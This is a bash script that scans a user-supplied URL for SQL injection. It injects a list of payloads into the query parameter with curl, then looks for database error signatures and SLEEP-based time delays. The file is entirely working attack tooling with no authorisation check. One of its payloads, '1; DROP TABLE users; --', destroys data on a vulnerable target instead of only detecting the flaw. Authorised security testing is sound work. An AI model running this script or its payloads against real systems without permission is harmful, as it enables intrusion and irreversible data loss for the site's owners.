#!/bin/bash

# ===========================
# Simple SQLi Vulnerability Scanner
# Author: Your Name
# ===========================

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 'http://target.com/page.php?id=1'"
    exit 1
fi

TARGET_URL=$1
LOGFILE="sqli_scan_$(date +%s).log"

# Common SQL Injection payloads
payloads=(
    "'"
    "\""
    "1 OR 1=1"
    "1' OR '1'='1"
    "1\" OR \"1\"=\"1"
    "1 AND SLEEP(3)"
    "1; DROP TABLE users; --"
)

# Common SQL error signatures
declare -a sql_errors=(
    "SQL syntax"
    "mysql_fetch"
    "ORA-01756"
    "Warning: mysql"
    "Unclosed quotation mark"
    "ODBC SQL"
    "PostgreSQL query failed"
    "You have an error in your SQL"
)

echo "[*] Starting SQLi scan on: $TARGET_URL"
echo "[*] Logging results to: $LOGFILE"
echo "----------------------------------------"

for payload in "${payloads[@]}"; do
    echo -e "\n[*] Testing payload: $payload"
    
    # Encode payload for URL safety
    encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")

    # Replace parameter value with payload
    test_url=$(echo "$TARGET_URL" | sed "s/=.*/=$encoded_payload/")

    # Fetch response
    response=$(curl -s -o /tmp/sqli_temp.html -w "%{http_code}" "$test_url")
    body=$(cat /tmp/sqli_temp.html)

    echo "HTTP Status: $response" >> $LOGFILE
    echo "Payload: $payload" >> $LOGFILE

    # Error signature detection
    for err in "${sql_errors[@]}"; do
        if echo "$body" | grep -qi "$err"; then
            echo "[!] Possible SQL Injection vulnerability detected!"
            echo "[!] Error signature: $err" | tee -a "$LOGFILE"
            echo "Tested URL: $test_url" | tee -a "$LOGFILE"
            break
        fi
    done
    
    # Timing detection for blind SQLi (if SLEEP-like payload used)
    if [[ "$payload" == *"SLEEP"* ]]; then
        start=$(date +%s)
        curl -s "$test_url" >/dev/null
        end=$(date +%s)
        diff=$((end - start))
        if [ "$diff" -gt 2 ]; then
            echo "[!] Possible Blind SQL Injection (time delay detected!)" | tee -a "$LOGFILE"
        fi
    fi

done

echo -e "\nScan completed."
echo "Results saved in $LOGFILE"
